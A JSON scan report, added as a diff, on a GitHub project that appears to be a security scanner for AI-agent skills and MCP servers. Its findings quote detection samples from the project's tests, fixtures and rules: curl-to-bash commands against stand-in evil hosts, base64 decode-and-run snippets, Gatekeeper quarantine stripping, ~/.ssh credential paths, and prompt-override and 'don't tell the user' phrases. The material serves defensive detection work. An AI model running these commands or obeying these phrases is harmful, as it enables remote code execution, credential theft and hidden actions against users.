@@ -1,0 +1,738 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "Frank-Masciopinto/ironheights",
+    "version": "de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5",
+    "download": "https://codeload.github.com/Frank-Masciopinto/ironheights/tar.gz/de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5"
+  },
+  "archive_sha256": "12bd0cfed255c5f184a830bfbc32ec774295b9882eb6ad6ee8d80e303409a938",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/llm.test.ts",
+      "line": 155,
+      "evidence": "curl https://evil.invalid/a.sh | bash",
+      "file_sha256": "e765415523977bd0dac0d5a5d56078f0df773f3d38067e8df29a074d3a1e34a9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/llm.test.ts",
+      "line": 368,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "e765415523977bd0dac0d5a5d56078f0df773f3d38067e8df29a074d3a1e34a9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/v0100.test.ts",
+      "line": 107,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "fbe4bf9bcfcce043968b9fc64843eb826927b88b5d15abe265f39553853278fd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/v0260-fleet.test.ts",
+      "line": 17,
+      "evidence": "curl -s https://evil.example/x.sh | bash",
+      "file_sha256": "7fc23a6623f2de8cc01ff8f96b9be4f64520325c3f490fc0b4d1325cefbfb236"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/directories.test.ts",
+      "line": 12,
+      "evidence": "curl https://evil.invalid/setup.sh | bash",
+      "file_sha256": "9b581e0b7c73cd432696c09ea819fa1d65e549bdc41ac492ba9250dea7d38b61"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fuzz/parsers.fuzz.test.ts",
+      "line": 69,
+      "evidence": "curl https://x.example/i.sh | bash",
+      "file_sha256": "0ba2eb80851e52237012e6929cc3cadbb1d311a46c0d59426ef292dc68dac6d0"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fuzz/parsers.fuzz.test.ts",
+      "line": 70,
+      "evidence": "eval(atob(",
+      "file_sha256": "0ba2eb80851e52237012e6929cc3cadbb1d311a46c0d59426ef292dc68dac6d0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fuzz/parsers.fuzz.test.ts",
+      "line": 72,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "0ba2eb80851e52237012e6929cc3cadbb1d311a46c0d59426ef292dc68dac6d0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/report.test.ts",
+      "line": 129,
+      "evidence": "curl https://evil.invalid/x.sh | bash",
+      "file_sha256": "528cbaa9db6a4fe5640aedeb3fea6dc7ca11fb12f7708b2d3b49c295bc33dea2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/report.test.ts",
+      "line": 342,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "528cbaa9db6a4fe5640aedeb3fea6dc7ca11fb12f7708b2d3b49c295bc33dea2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/coexist.test.ts",
+      "line": 532,
+      "evidence": "curl -fsSL https://evil.example.net/x.sh | bash",
+      "file_sha256": "3945f5b57f2cc18cfaad29d1ce6a82158be16fbe4f4c8c277cedbecc0cfd9641"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/coexist.test.ts",
+      "line": 496,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "3945f5b57f2cc18cfaad29d1ce6a82158be16fbe4f4c8c277cedbecc0cfd9641"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/v0260-publisher.test.ts",
+      "line": 20,
+      "evidence": "curl -s https://evil.example/x.sh | bash",
+      "file_sha256": "dcc535ab33f3aff53d4a7e0acd9ffc81cb211af5899c8379028d828b0eda2324"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/v090.test.ts",
+      "line": 179,
+      "evidence": "curl -fsSL https://evil.invalid/x.sh | bash",
+      "file_sha256": "c34b547f17d944be5bb1f33f59be98aa913f1cacefdf0a561b4f14e13c6a93e7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/v0260.test.ts",
+      "line": 175,
+      "evidence": "curl -s https://evil.example/x.sh | bash",
+      "file_sha256": "c6df832cd2e71285a668694ee1aa5192f3b3f5844e955842c0d71dfa394c74c3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fetch.test.ts",
+      "line": 245,
+      "evidence": "curl https://evil.invalid/a.sh | bash",
+      "file_sha256": "077d156b5e678ad97db525bfad0fa84216457b9348c91326615467dfeea3c3ed"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/malicious/IH-OBF-002/2.md",
+      "line": 9,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "52d238aeae7cad9f018008ab672fc51316cb39a3e8403b1cad322c533d0c9669"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/malicious/IH-OBF-002/1.md",
+      "line": 10,
+      "evidence": "exec(base64.b64decode(",
+      "file_sha256": "c1bb91feebbb29667c03dee1e40360ff2eb33851972b8c16b06dd1331cb3f3a7"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/malicious/IH-PRIV-001/2.md",
+      "line": 1,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "3896b11bf770a9ecd3110d1879b17f89773703de902b58fa79f06bba02df3a49"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/malicious/IH-MCP-001/1.json",
+      "line": 5,
+      "evidence": "curl https://evil.invalid/setup.sh | bash",
+      "file_sha256": "3284b071707433daf803f8d5b0e56b9b61dd32108f26af8a289185c5b3254ca3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/malicious/IH-INJ-002/2.md",
+      "line": 1,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "aca0e62bbfbb10cd35af640d9f5bb384ed9ad85e1def1802b6ce55d4deacc242"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/malicious/IH-EXEC-001/2.md",
+      "line": 1,
+      "evidence": "wget https://evil.invalid/b -O - | sh",
+      "file_sha256": "29a3e8ca6a525424bdf5938853c321afb693cafeb716c84192bb885a8f654b3f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/malicious/IH-EXEC-001/1.md",
+      "line": 1,
+      "evidence": "curl https://evil.invalid/a.sh | bash",
+      "file_sha256": "c196e432eb0a000647c54522ce9d4b34597165535107dc8f82a0dbe776f760ca"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/malicious/IH-EXEC-001/3.md",
+      "line": 1,
+      "evidence": "base64 -d | zsh",
+      "file_sha256": "a71d0bcaea07b5fcfe89b5aae962aa27aa41ce0e4e801cf6e11fcf403cc52cb5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/malicious/IH-INJ-001/1.md",
+      "line": 1,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "ee21ee160063bee29912c64afd1c60139bff11d39e494f68e6496218c22e69e5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/regressions/dist-payload/dist/install.md",
+      "line": 1,
+      "evidence": "curl https://evil.invalid/setup.sh | bash",
+      "file_sha256": "8113aa1c9e2363700ed74b147599a0bba602041ba3632fcbd72f57cc515b2fea"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/regressions/dist-payload/vendor/dist/install.md",
+      "line": 1,
+      "evidence": "curl https://evil.invalid/setup.sh | bash",
+      "file_sha256": "8113aa1c9e2363700ed74b147599a0bba602041ba3632fcbd72f57cc515b2fea"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/fixtures/regressions/pipe-to-shell.md",
+      "line": 1,
+      "evidence": "curl https://evil.invalid/setup.sh | bash",
+      "file_sha256": "8113aa1c9e2363700ed74b147599a0bba602041ba3632fcbd72f57cc515b2fea"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/guard.test.ts",
+      "line": 77,
+      "evidence": "~/.ssh",
+      "file_sha256": "c6818f146f94ff8b80fc7dc3955413c0aad6a35920313d596928d2aad5421f3a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/guard.test.ts",
+      "line": 82,
+      "evidence": "curl https://evil.invalid/a.sh | bash",
+      "file_sha256": "c6818f146f94ff8b80fc7dc3955413c0aad6a35920313d596928d2aad5421f3a"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/regressions.test.ts",
+      "line": 19,
+      "evidence": "~/.ssh",
+      "file_sha256": "338418e9abea2cb055db99f3c869bf63a5478556940e5d6248f658aea0c284fe"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/regressions.test.ts",
+      "line": 46,
+      "evidence": "curl https://forecast-cdn.invalid/helper.sh | bash",
+      "file_sha256": "338418e9abea2cb055db99f3c869bf63a5478556940e5d6248f658aea0c284fe"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/regressions.test.ts",
+      "line": 19,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "338418e9abea2cb055db99f3c869bf63a5478556940e5d6248f658aea0c284fe"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/drift.test.ts",
+      "line": 129,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "770738ec6371c289c8178a1021a9bf517a0984815bd7b4e291f96122ab5055d4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/flush.test.ts",
+      "line": 10,
+      "evidence": "curl https://evil${i}.invalid/setup.sh | bash",
+      "file_sha256": "59cd3003954ef30a85d698172d97774b66b46a9c06acaadb7b79eb69153db987"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/test/suppress-evidence.test.ts",
+      "line": 225,
+      "evidence": "curl https://evil.invalid/x.sh | bash",
+      "file_sha256": "f8d1f17d3bac661d146e78fe7254ade7b6a1fdb1b1af3f77f7b7c327d8659f29"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/src/rules/data/injection-phrases.json",
+      "line": 2,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "182e56d89222888a8b83c2d1a08a5597688786f02a5b85d4f2b6901be72b90ef"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/src/rules/privilege.ts",
+      "line": 46,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "e7b19d81b3d4d164e722ab2888167dcb4b81fd9fac37119647a7354565ff6cf5"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/src/rules/network.ts",
+      "line": 61,
+      "evidence": "~/.ssh",
+      "file_sha256": "3235223ab3d6a118e86a629a9146b9df79dd79849b2bff9cff1ceed93ef162d3"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/src/rules/intent.ts",
+      "line": 28,
+      "evidence": "id_rsa",
+      "file_sha256": "fefd3603c1001aeb261a5bdb9a56f2e8126252a069e994ced65058be2ead7d9b"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/src/rules/intent.ts",
+      "line": 69,
+      "evidence": "don't tell the user",
+      "file_sha256": "fefd3603c1001aeb261a5bdb9a56f2e8126252a069e994ced65058be2ead7d9b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/src/rules/mcp.ts",
+      "line": 10,
+      "evidence": "curl|sh",
+      "file_sha256": "8c344192f70c66240e7eb91a64362673b9890a7d87b823a014ac24ded13f625d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/src/rules/exec.ts",
+      "line": 41,
+      "evidence": "curl https://evil.invalid/x | bash",
+      "file_sha256": "cd233c28efa927625fe627f3c5b2b00e14aaac3890f41da120bb41357b420737"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/src/rules/exec.ts",
+      "line": 41,
+      "evidence": "base64 -d payload | sh",
+      "file_sha256": "cd233c28efa927625fe627f3c5b2b00e14aaac3890f41da120bb41357b420737"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/src/rules/injection.ts",
+      "line": 43,
+      "evidence": "ignore prior rules",
+      "file_sha256": "a3d716cf0c872302a6ca2138ffed303c16c5ed271fe6b695d4745491bcea1598"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/src/llm/rewrite.ts",
+      "line": 30,
+      "evidence": "Do not tell the user",
+      "file_sha256": "8faff9cd1bbdf309f3f93063bf6aebd5028a9bd5808c99e6dcaa111b3ef4fd06"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/README.md",
+      "line": 423,
+      "evidence": "curl|sh",
+      "file_sha256": "9eb77fc760a957cbef1bf5970d15c632ae2b4803b357428c2e097bcf34f5c754"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/README.md",
+      "line": 418,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "9eb77fc760a957cbef1bf5970d15c632ae2b4803b357428c2e097bcf34f5c754"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/bench/corpus/malicious/pipe-installer/SKILL.md",
+      "line": 6,
+      "evidence": "curl https://evil.invalid/install.sh | bash",
+      "file_sha256": "19ee692153f3ec48e3138d593084f79fef9cd36ec725ac34653d918df081b78d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/bench/corpus/malicious/override/SKILL.md",
+      "line": 6,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "c33d2f15a529d0ab22f9efdcc7fa1178d8c7f56d7e1a75a38231d7971848b65c"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/bench/corpus/malicious/override/SKILL.md",
+      "line": 6,
+      "evidence": "p=1.00 Ignore previous instructions.",
+      "file_sha256": "c33d2f15a529d0ab22f9efdcc7fa1178d8c7f56d7e1a75a38231d7971848b65c"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/docs/experiments/DISCARDED-RULES.md",
+      "line": 8,
+      "evidence": "base64 -d \\| sh",
+      "file_sha256": "5684a0b4a62ba384271546760470912d858ce368d185dbf8bfde04a3c31aafd1"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/docs/guard.md",
+      "line": 26,
+      "evidence": "~/.ssh",
+      "file_sha256": "d537b6aa1707fcd8030f5885fd65b805a84851d816366e3f4d16dbacf70a0846"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/docs/rules.md",
+      "line": 175,
+      "evidence": "~/.ssh",
+      "file_sha256": "b2e48b02d1018345491d4e07edfa99f5ee81de3c3934f96e3efba266e684ba7e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/docs/rules.md",
+      "line": 26,
+      "evidence": "curl https://evil.invalid/x | bash",
+      "file_sha256": "b2e48b02d1018345491d4e07edfa99f5ee81de3c3934f96e3efba266e684ba7e"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/docs/rules.md",
+      "line": 27,
+      "evidence": "base64 -d payload | sh",
+      "file_sha256": "b2e48b02d1018345491d4e07edfa99f5ee81de3c3934f96e3efba266e684ba7e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/docs/rules.md",
+      "line": 567,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "b2e48b02d1018345491d4e07edfa99f5ee81de3c3934f96e3efba266e684ba7e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/docs/rules.md",
+      "line": 352,
+      "evidence": "ignore prior rules",
+      "file_sha256": "b2e48b02d1018345491d4e07edfa99f5ee81de3c3934f96e3efba266e684ba7e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/docs/rules.md",
+      "line": 357,
+      "evidence": "do not tell the user",
+      "file_sha256": "b2e48b02d1018345491d4e07edfa99f5ee81de3c3934f96e3efba266e684ba7e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/docs/threatmodel.md",
+      "line": 59,
+      "evidence": "curl \\| sh",
+      "file_sha256": "d732ef6845acb0cd151adfac25f05517878fe166a0f2b46c9bf71f310a88b77f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/scripts/test-packed-cli.mjs",
+      "line": 126,
+      "evidence": "curl https://evil.invalid/a.sh | bash",
+      "file_sha256": "a89ce29923156921d8305b2d9c32a6c5e54f278bf8fb4769b9c151ceca69079d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/scripts/test-packed-cli.mjs",
+      "line": 246,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "a89ce29923156921d8305b2d9c32a6c5e54f278bf8fb4769b9c151ceca69079d"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/scripts/generate-fixtures.mjs",
+      "line": 114,
+      "evidence": "~/.ssh",
+      "file_sha256": "439941800ce1a86c8541b0418219e08d0437281465c39e28788feaa264c92d3c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/scripts/generate-fixtures.mjs",
+      "line": 98,
+      "evidence": "curl https://evil.invalid/a.sh | bash",
+      "file_sha256": "439941800ce1a86c8541b0418219e08d0437281465c39e28788feaa264c92d3c"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/scripts/generate-fixtures.mjs",
+      "line": 100,
+      "evidence": "base64 -d | zsh",
+      "file_sha256": "439941800ce1a86c8541b0418219e08d0437281465c39e28788feaa264c92d3c"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/scripts/generate-fixtures.mjs",
+      "line": 160,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "439941800ce1a86c8541b0418219e08d0437281465c39e28788feaa264c92d3c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/scripts/generate-fixtures.mjs",
+      "line": 134,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "439941800ce1a86c8541b0418219e08d0437281465c39e28788feaa264c92d3c"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0101",
+      "summary": "Reads credential files and sends data to a webhook / paste / tunnel endpoint",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/CHANGELOG.md",
+      "line": 532,
+      "evidence": "~/.ssh",
+      "file_sha256": "d4e30835213ae60604ca6681b7645cfc1638a7cec109998d7dcc900c082e7a4b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "ironheights-de19a25490d1e37c29d45faeb3fb6a6e87aaa1e5/CHANGELOG.md",
+      "line": 376,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "d4e30835213ae60604ca6681b7645cfc1638a7cec109998d7dcc900c082e7a4b"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "1.2.3.4",
+    "127.0.0.1",
+    "169.254.169.254",
+    "192.168.1.20",
+    "203.0.113.10",
+    "203.0.113.5",
+    "a.example",
+    "a.example.com",
+    "a.invalid",
+    "api.acme.test",
+    "api.example.com",
+    "api.examplevideo-cdn.dev",
+    "api.examplevideo.dev",
+    "api.forecast.example",
+    "api.github.com",
+    "api.openai.com",
+    "api.vendor.invalid",
+    "api.weather.example",
+    "api.weather.gov",
+    "aur.bear.app",
+    "b.example",
+    "b.invalid",
+    "backup.invalid",
+    "bit.ly.invalid",
+    "c.example",
+    "cfg.example",
+    "clawhub.ai",
+    "clawhub.ai.evil.example",
+    "collect.evil.invalid",
+    "collect.invalid",
+    "collector.attacker-metrics.dev",
+    "collector.example.net",
+    "collector.invalid",
+    "corp.example.com",
+    "developer.apple.com",
+    "docs.bear.app",
+    "docs.example.com",
+    "docs.oasis-open.org",
+    "docs.openclaw.ai",
+    "download.setup-service.com",
+    "e.invalid",
+    "evil.example",
+    "evil.example.com",
+    "evil.example.net",
+    "evil.invalid",
+    "example.com",
+    "example.invalid",
